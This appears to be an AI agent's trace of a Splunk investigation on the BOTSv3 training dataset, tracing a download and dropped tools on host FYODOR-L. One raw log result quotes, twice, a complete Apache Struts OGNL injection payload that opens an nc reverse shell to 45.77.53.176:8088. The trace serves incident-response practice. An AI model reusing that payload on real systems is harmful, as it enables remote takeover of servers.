{"host": "ABUNGST-L", "EventCode": "3", "_time": "2018-08-20T18:06:53.000+08:00", "count": "1"}], "meta": {"total_event_count": 3669, "returned": 50, "sid": "1790258438.1406", "truncated": "showing 50 of 3669 rows, in the query's own order \u2014 the other 3619 were not returned, so this result says nothing about them. To reach what you need among them, don't page: narrow the query with what the question tells you."}}


[STATE:agent_in]  step=5  msgs=11  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"host": "ABUNGST-L", "EventCode": "3", "_time": "2018-08-20T18:01:04.000+08:00", "count": "1"}, {"host": "'

[Agent thinking]
Intention: The stream:http download came from src 192.168.70.186 — I need to confirm which host that is (FYODOR-L expected) and read the full event for the downloaded file details.



[STATE:verify_in]  step=6  msgs=12  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"45.77.53.176\" | stats count by host, src_ip, dest_ip, uri_path, content_type, http_user_agent, bytes, _time"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=6  msgs=12  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"45.77.53.176\" | stats count by host, src_ip, dest_ip, uri_path, content_type, http_user_agent, bytes, _time"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"45.77.53.176\" | stats count by host, src_ip, dest_ip, uri_path, content_type, http_user_agent, bytes, _time"})
          -> {"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258453.1408"}}


[STATE:agent_in]  step=6  msgs=13  errors=0  empty=1  verified=True
  last_msg: ToolMessage -> '{"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258453.1408"}}'

[Agent thinking]
Intention: The previous query returned nothing when adding more fields — likely a fieldsummary issue; retry with the fields I know exist, and read the raw event to see the full HTTP response including the downloaded file name.



[STATE:verify_in]  step=7  msgs=14  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: get_raw_events({"limit":5,"index":"botsv3","keyword":"45.77.53.176","sourcetype":"stream:http"})
[Verify OK]     get_raw_events

[STATE:execute_in]  step=7  msgs=14  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: get_raw_events({"limit":5,"index":"botsv3","keyword":"45.77.53.176","sourcetype":"stream:http"})
[Execute] get_raw_events({"index":"botsv3","keyword":"45.77.53.176","limit":5,"sourcetype":"stream:http"})
          -> {"results": [{"_time": "2018-08-20T19:34:01.509+08:00", "_raw": "{\"endtime\":\"2018-08-20T11:34:01.509006Z\",\"timestamp\":\"2018-08-20T11:34:01.509006Z\",\"bytes\":1543,\"src_mac\":\"00:21:A0:AA:0B:BC\",\"src_port\":50504,\"bytes_in\":1543,\"dest_ip\":\"192.168.9.30\",\"dest_mac\":\"00:0C:29:FB:12:05\",\"dest_port\":8080,\"bytes_out\":0,\"time_taken\":118202,\"transport\":\"tcp\",\"flow_id\":\"4d1ae5ff-f023-4c8e-adc2-a31630cc218d\",\"src_ip\":\"192.168.8.103\",\"form_data\":\"age=1&__checkbox_bustedBefore=true&name=${(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}&description=1\",\"site\":\"192.168.9.30:8080\",\"http_method\":\"POST\",\"uri_path\":\"/frothlyinventory/integration/saveGangster.action\",\"http_user_agent\":\"python-requests/2.18.4\",\"protocol_stack\":\"ip:tcp:http\"}"}, {"_time": "2018-08-20T19:13:57.437+08:00", "_raw": "{\"endtime\":\"2018-08-20T11:13:57.437813Z\",\"timestamp\":\"2018-08-20T11:13:57.437813Z\",\"bytes\":1543,\"src_mac\":\"00:21:A0:AA:0B:BC\",\"src_port\":49340,\"bytes_in\":1543,\"dest_ip\":\"192.168.9.30\",\"dest_mac\":\"00:0C:29:FB:12:05\",\"dest_port\":8080,\"bytes_out\":0,\"time_taken\":102562,\"transport\":\"tcp\",\"flow_id\":\"a29a8b71-4588-41f0-90f3-46e4b376bcdf\",\"src_ip\":\"192.168.8.103\",\"form_data\":\"age=1&__checkbox_bustedBefore=true&name=${(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}&description=1\",\"site\":\"192.168.9.30:8080\",\"http_method\":\"POST\",\"uri_path\":\"/frothlyinventory/integration/saveGangster.action\",\"http_user_agent\":\"python-requests/2.18.4\",\"protocol_stack\":\"ip:tcp:http\"}"}, {"_time": "2018-08-20T18:48:58.101+08:00", "_raw": "{\"endtime\":\"2018-08-20T10:48:58.101343Z\",\"timestamp\":\"2018-08-20T10:48:58.101343Z\",\"count\":1,\"dest_ip\":\"45.77.53.176\",\"site\":\"45.77.53.176:3333\",\"status\":200,\"uri_path\":\"/images/logos.png\",\"sum(bytes_in)\":177,\"sum(bytes_out)\":5542140,\"sum(time_taken)\":11149728}"}, {"_time": "2018-08-20T18:48:58.101+08:00", "_raw": "{\"endtime\":\"2018-08-20T10:48:58.101343Z\",\"timestamp\":\"2018-08-20T10:48:58.101343Z\",\"count\":1,\"dest_ip\":\"45.77.53.176\",\"status\":200}"}, {"_time": "2018-08-20T18:48:58.101+08:00", "_raw": "{\"endtime\":\"2018-08-20T10:48:58.101343Z\",\"timestamp\":\"2018-08-20T10:48:58.101343Z\",\"count\":1,\"dest_ip\":\"45.77.53.176\",\"sum(time_taken)\":11149728}"}], "meta": {"total_event_count": 5, "returned": 5, "sid": "1790258459.1410"}}


[STATE:agent_in]  step=7  msgs=15  errors=0  empty=1  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T19:34:01.509+08:00", "_raw": "{\\"endtime\\":\\"2018-08-20T11:34:01.509006Z\\",\\"timestam'

[Agent thinking]
Intention: The download is GET /images/logos.png (5.5MB) from 45.77.53.176:3333 by src 192.168.70.186. Now confirm which host owns that IP and find Sysmon EventCode=3 with dest_port=3333 to tie the download to FYODOR-L.



[STATE:verify_in]  step=8  msgs=16  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=3 dest_ip=\"45.77.53.176\" dest_port=3333 | stats count by host, src_ip, _time"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=8  msgs=16  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=3 dest_ip=\"45.77.53.176\" dest_port=3333 | stats count by host, src_ip, _time"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=3 dest_ip=\"45.77.53.176\" dest_port=3333 | stats count by host, src_ip, _time"})
          -> {"results": [{"host": "FYODOR-L", "src_ip": "192.168.70.186", "_time": "2018-08-20T18:47:06.000+08:00", "count": "1"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258471.1411"}}


[STATE:agent_in]  step=8  msgs=17  errors=0  empty=1  verified=True
  last_msg: ToolMessage -> '{"results": [{"host": "FYODOR-L", "src_ip": "192.168.70.186", "_time": "2018-08-20T18:47:06.000+08:00", "count": "1"}], '

[Agent thinking]
Intention: Now find Sysmon file-creation events (EventCode=11) on FYODOR-L after the 18:47 download, to see the created tools and the downloaded container file.



[STATE:verify_in]  step=9  msgs=18  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 _time>=\"2018-08-20 18:40:00\" _time<=\"2018-08-20 20:00:00\" | stats count by TargetFilename, _time"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=9  msgs=18  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 _time>=\"2018-08-20 18:40:00\" _time<=\"2018-08-20 20:00:00\" | stats count by TargetFilename, _time"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 _time>=\"2018-08-20 18:40:00\" _time<=\"2018-08-20 20:00:00\" | stats count by TargetFilename, _time"})
          -> {"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258480.1412"}}


[STATE:agent_in]  step=9  msgs=19  errors=0  empty=2  verified=True
  last_msg: ToolMessage -> '{"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790258480.1412"}}'

[Agent thinking]
Intention: The time filter may be off — the stream:http event showed 18:47:16 +08:00 but Sysmon events may be in a different timezone. Let me check the time range of FYODOR-L Sysmon file-creation events without a time filter.



[STATE:verify_in]  step=10  msgs=20  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 | stats count by TargetFilename"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=10  msgs=20  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 | stats count by TargetFilename"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 | stats count by TargetFilename"})
          -> {"results": [{"TargetFilename": "C:\\Users\\FYODOR~1\\AppData\\Local\\Temp\\3F5D15FE-AD68-4E1F-B3C4-90E199AF3640\\DismHost.exe", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk.qy8e4dh.partial", "count": "2"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk.qy8e4dh.partial:Zone.Identifier", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.gapi8f2.partial", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4ysjugtb.32q.ps1", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_equi3wwh.s2h.ps1", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m4mweu01.w0d.ps1", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_oiww1jjj.fo5.ps1", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pmhyaqar.n3i.ps1", "count": "1"}, {"TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_to1mhtq0.dle.ps1", "count": "1"}, {"TargetFilename": "C:\\Windows\\System32\\Tasks\\Updater", "count": "1"}, {"TargetFilename": "C:\\Windows\\System32\\drivers\\etc\\hosts.ac.tmp", "count": "3"}, {"TargetFilename": "C:\\Windows\\Temp\\__PSScriptPolicyTest_gyiame5o.sxw.ps1", "count": "1"}, {"TargetFilename": "C:\\Windows\\Temp\\__PSScriptPolicyTest_swvo5cbn.khc.ps1", "count": "1"}, {"TargetFilename": "C:\\Windows\\Temp\\hdoor.exe", "count": "1"}, {"TargetFilename": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "count": "1"}, {"TargetFilename": "C:\\Windows\\Temp\\unziped\\lsof-master\\powershell.exe", "count": "1"}], "meta": {"total_event_count": 18, "returned": 18, "sid": "1790258486.1413"}}


[STATE:agent_in]  step=10  msgs=21  errors=0  empty=2  verified=True
  last_msg: ToolMessage -> '{"results": [{"TargetFilename": "C:\\\\Users\\\\FYODOR~1\\\\AppData\\\\Local\\\\Temp\\\\3F5D15FE-AD68-4E1F-B3C4-90E199AF3640\\\\DismHo'
[Max iterations reached — forcing final answer]

[Agent thinking]
I've reached my tool-call limit. I have a strong evidence chain: the single retrieval from 45.77.53.176:3333 was GET /images/logos.png (5.5 MB), and Sysmon file-creation events on FYODOR-L show the attack tools (iexeplorer.exe, powershell.exe) appearing in a `C:\Windows\Temp\unziped\` directory — an extraction directory — plus hdoor.exe. The retrieved logos.png is the inferred container; the executables are its contents.


[WORKER RESULT] Senior-1-Q316: I've reached my tool-call limit. I have a strong evidence chain: the single retrieval from 45.77.53.176:3333 was GET /images/logos.png (5.5 MB), and Sysmon file-creation events on FYODOR-L show the at

[STATE:agent_in]  step=0  msgs=24  errors=0  empty=0  verified=False
  last_msg: HumanMessage -> '[CONTINUE] On FYODOR-L, establish the container-to-contents chain for the 45.77.53.176:3333 retrieval. Show from complet'

[Agent thinking]
Intention: Establish the complete HTTP retrieval picture for FYODOR-L (src 192.168.70.186) to confirm logos.png is the only download on that path, and get Sysmon file-creation events with timestamps and creating-process details.


[STATE:verify_in]  step=1  msgs=25  errors=0  empty=0  verified=False
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" | stats count, sum(bytes_out) as bytes_out_total by uri_path, dest_ip, site, status, http_method"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=1  msgs=25  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" | stats count, sum(bytes_out) as bytes_out_total by uri_path, dest_ip, site, status, http_method"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" src_ip=\"192.168.70.186\" | stats count, sum(bytes_out) as bytes_out_total by uri_path, dest_ip, site, status, http_method"})
          -> {"results": [{"uri_path": "/", "dest_ip": "162.144.189.172", "site": "www.weepingradish.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "33118"}, {"uri_path": "/", "dest_ip": "165.227.31.78", "site": "canteenbrewhouse.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "11174"}, {"uri_path": "/", "dest_ip": "165.227.31.78", "site": "www.canteenbrewhouse.com", "status": "301", "http_method": "GET", "count": "1", "bytes_out_total": "258"}, {"uri_path": "/", "dest_ip": "173.255.233.229", "site": "happyvalleybeer.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "10019"}, {"uri_path": "/", "dest_ip": "173.255.233.229", "site": "happyvalleybrewingcompany.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "10048"}, {"uri_path": "/", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "http_method": "GET", "count": "5", "bytes_out_total": "36311"}, {"uri_path": "/", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "302", "http_method": "POST", "count": "1", "bytes_out_total": "612"}, {"uri_path": "/", "dest_ip": "52.109.12.84", "site": "portal.office365.com", "status": "302", "http_method": "GET", "count": "1", "bytes_out_total": "520"}, {"uri_path": "/", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "5335"}, {"uri_path": "/GTSGIAG3/MEkwRzBFMEMwQTAJBgUrDgMCGgUABBT27bBjYjKBmjX2jXWgnQJKEapsrQQUd8K4UJpndnaxLcKG0IOgfqZ%2BuksCCEM5Rm4ycYDk", "dest_ip": "216.58.194.174", "site": "ocsp.pki.goog", "status": "200", "http_method": "GET", "count": "2", "bytes_out_total": "1434"}, {"uri_path": "/GTSGIAG3/MEkwRzBFMEMwQTAJBgUrDgMCGgUABBT27bBjYjKBmjX2jXWgnQJKEapsrQQUd8K4UJpndnaxLcKG0IOgfqZ%2BuksCCEsy3nLKooNp", "dest_ip": "216.58.194.174", "site": "ocsp.pki.goog", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "717"}, {"uri_path": "/GTSGIAG3/MEkwRzBFMEMwQTAJBgUrDgMCGgUABBT27bBjYjKBmjX2jXWgnQJKEapsrQQUd8K4UJpndnaxLcKG0IOgfqZ%2BuksCCGFquezHariY", "dest_ip": "216.58.194.174", "site": "ocsp.pki.goog", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "717"}, {"uri_path": "/MEIwQDA%2BMDwwOjAJBgUrDgMCGgUABBQdI2%2BOBkuXH93foRUj4a7lAr4rGwQUOpqFBxBnKLbv9r0FQW4gwZTaD94CAQc%3D", "dest_ip": "50.63.243.230", "site": "ocsp.godaddy.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "2219"}, {"uri_path": "/MEQwQjBAMD4wPDAJBgUrDgMCGgUABBTkIInKBAzXkF0Qh0pel3lfHJ9GPAQU0sSw0pHUTBFxs2HLPaH%2B3ahq1OMCAxvnFQ%3D%3D", "dest_ip": "50.63.243.230", "site": "ocsp.godaddy.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "2186"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBQLqIKj6Gi5thHaqKC1ECU9aXsCRQQUmvMr2s%2BtT7YvuypISCoStxtCwSQCEAwVv1ET25DRN9Laswdl4Rw%3D", "dest_ip": "23.72.38.10", "site": "ocsp.comodoca.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "862"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBReAhtobFzTvhaRmVeJ38QUchY9AwQUu69%2BAj36pvE8hI6t7jiY7NkyMtQCEDaCXn%2B1pIGTfvbRc2u5PKY%3D", "dest_ip": "23.72.38.10", "site": "ocsp.comodoca.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "1123"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBSAUQYBMq2awn1Rh6Doh%2FsBYgFV7gQUA95QNVbRTLtm8KPiGxvDl7I90VUCEAH9o%2BtuynXIiEOLckvPvJE%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBSAUQYBMq2awn1Rh6Doh%2FsBYgFV7gQUA95QNVbRTLtm8KPiGxvDl7I90VUCEArLKLpGXuU5CHZ0cPPNxhI%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTBL0V27RVZ7LBduom%2FnYB45SPUEwQU5Z1ZMIJHWMys%2BghUNoZ7OrUETfACEA8sEMlbBsCTf7jUSfg%2BhWk%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTBL0V27RVZ7LBduom%2FnYB45SPUEwQU5Z1ZMIJHWMys%2BghUNoZ7OrUETfACEAi4elAbvpzaLRZNPjlRv1U%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTBL0V27RVZ7LBduom%2FnYB45SPUEwQU5Z1ZMIJHWMys%2BghUNoZ7OrUETfACEAiIzVJfGSRETRSlgpHeuVI%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "2", "bytes_out_total": "1576"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTBL0V27RVZ7LBduom%2FnYB45SPUEwQU5Z1ZMIJHWMys%2BghUNoZ7OrUETfACEAtqs7A%2Bsan2xGCSaqjN%2FrM%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "2", "bytes_out_total": "1576"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTPJvUY%2Bsl%2Bj4yzQuAcL2oQno5fCgQUUWj%2FkK8CB3U8zNllZGKiErhZcjsCEA2cChWo4fPillbq%2FWkq4%2BE%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTPJvUY%2Bsl%2Bj4yzQuAcL2oQno5fCgQUUWj%2FkK8CB3U8zNllZGKiErhZcjsCEAjujAQ%2Fy05uTngjUP5FDgk%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTPJvUY%2Bsl%2Bj4yzQuAcL2oQno5fCgQUUWj%2FkK8CB3U8zNllZGKiErhZcjsCEAs8O2AaGPWe4ra7BWBe8sA%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTfqhLjKLEJQZPin0KCzkdAQpVYowQUsT7DaQP4v0cB1JgmGggC72NkK8MCEATh56TcXPLzbcArQrhdFZ8%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "788"}, {"uri_path": "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTnvAI%2FnN49qPTJY2qTQtfkLxjvEAQUo53mH%2FnaOU%2FAbuiRy5Wl2jHiCp8CEAHU1tIRV0LZhVOuZBfdVxI%3D", "dest_ip": "72.21.91.29", "site": "ocsp.digicert.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "629"}, {"uri_path": "/MFQwUjBQME4wTDAJBgUrDgMCGgUABBQphfxhPb4vsBIPXkIOTJ7D1Z79fAQUCP4ln3TqhwTCvLuOqDhfM8bRbGUCEy0AAIDRU2YL2JJtYm8AAAAAgNE%3D", "dest_ip": "104.18.24.243", "site": "ocsp.msocsp.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "2406"}, {"uri_path": "/MFQwUjBQME4wTDAJBgUrDgMCGgUABBQphfxhPb4vsBIPXkIOTJ7D1Z79fAQUCP4ln3TqhwTCvLuOqDhfM8bRbGUCEy0AARRtLpIITIXWaVYAAAABFG0%3D", "dest_ip": "104.18.24.243", "site": "ocsp.msocsp.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "2406"}, {"uri_path": "/MFQwUjBQME4wTDAJBgUrDgMCGgUABBSIGkp0%2Fv9GUvNUu1EP06Tu7%2BChyAQUkZ47RGw9V5xCdyo010%2FRzEqXLNoCEyAAAQ91Be8HFROcknAAAAABD3U%3D", "dest_ip": "104.18.24.243", "site": "ocsp.msocsp.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "2406"}, {"uri_path": "/_Incapsula_Resource", "dest_ip": "45.60.12.68", "site": "dbbrewingcompany.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "90"}, {"uri_path": "/ajax/libs/jquery/1.8.0/jquery.min.js", "dest_ip": "172.217.6.74", "site": "ajax.googleapis.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "33788"}, {"uri_path": "/ajax/libs/jquery/1/jquery.min.js", "dest_ip": "216.58.194.170", "site": "ajax.googleapis.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "33937"}, {"uri_path": "/assets/21A-BabyHorse-2017-12oz-57x108.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "11348"}, {"uri_path": "/assets/21A-BlahBlahBlahIPA-2018-12oz-57x108.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "13614"}, {"uri_path": "/assets/21A-BloodOrange-2018-12oz-57x108.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "14707"}, {"uri_path": "/assets/21A-BrewFree-2018-12oz-57x108.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "14130"}, {"uri_path": "/assets/21A-ElSully-Compressed-e1444171682154.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "340666"}, {"uri_path": "/assets/21A-TastyIPA-2018-12oz-57x108.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "15406"}, {"uri_path": "/assets/21A-WatermelonFunk-12oz-57x108.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "14558"}, {"uri_path": "/assets/21a-DTE-can-mockup-no-shadow-57x108.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "14078"}, {"uri_path": "/assets/AFest.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "232678"}, {"uri_path": "/assets/Hell-or-High-Watermelon-3d-can-copy1-146x285.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "80299"}, {"uri_path": "/assets/Hell-or-High-Watermelon-3d-can-copy1-57x111.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "14956"}, {"uri_path": "/assets/MENU-FOR-WEB-01-e1482345993643.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "50491"}, {"uri_path": "/assets/SA-CAN-PNG-57x105.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "13269"}, {"uri_path": "/assets/SVBW-540x139.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "115424"}, {"uri_path": "/assets/Website-Augustfest-Banner.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "882159"}, {"uri_path": "/assets/backinblack_can_022113-57x101.png", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "12955"}, {"uri_path": "/assets/brunch.jpeg", "dest_ip": "70.32.68.105", "site": "21st-amendment.com", "status": "200", "http_method": "GET", "count": "1", "bytes_out_total": "8799"}], "meta": {"total_event_count": 362, "returned": 50, "sid": "1790258543.1414", "truncated": "showing 50 of 362 rows, in the query's own order \u2014 the other 312 were not returned, so this result says nothing about them. To reach what you need among 